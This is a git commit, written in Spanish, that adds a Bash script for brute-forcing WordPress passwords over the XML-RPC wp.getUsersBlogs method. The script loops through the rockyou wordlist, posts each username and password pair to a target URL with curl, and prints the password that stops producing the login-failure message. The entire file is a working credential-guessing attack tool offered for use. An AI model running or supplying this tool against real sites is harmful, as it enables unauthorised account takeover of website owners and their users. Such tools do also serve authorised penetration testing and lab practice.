b57b6b4961c115db198dea100808f9ca2b8bca0f
BeniBeastt <retroo1414@gmail.com>
2023-08-11 17:01:09 +0200

    Herramienta Brute_Force XML-RPC
    Herramienta para Aplicar Fuerza Bruta sobre el XML-RPC de Wordpress

---
+++ xmlrpc_bruteforce.sh
@@ -0,0 +1,52 @@
+#!/bin/bash 
+
+function Ctrl_c(){
+  echo -e "[!] Saliendo del script...\n"
+  exit 1
+}
+
+#Ctrl_c
+trap Ctrl_c INT
+
+if [ $# -ne 2 ]; then
+  echo -e "No se han proporcionado los argumentos necesarios...\n"
+  echo "Uso: $0 usuario URL"
+  exit 1
+fi
+
+user=$1
+url=$2
+
+
+function createXML(){
+  password=$1
+  user=$2
+  url=$3
+
+  # xml File
+  xmlFile="""
+<?xml version="1.0" encoding="UTF-8"?>
+<methodCall> 
+<methodName>wp.getUsersBlogs</methodName> 
+<params> 
+<param><value>$user</value></param> 
+<param><value>$password</value></param> 
+</params> 
+</methodCall>
+  """
+
+
+  echo $xmlFile > data.xml 
+
+  response=$(curl -s -X POST $url -d@data.xml)
+
+
+  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
+    echo -e "La contraseña para el usuario \e[35m$user\e[0m es: \e[35m$password\e[0m"
+    exit 0 
+  fi
+}
+
+cat /opt/SecLists/rockyou.txt | while read password; do 
+  createXML $password $user $url
+done
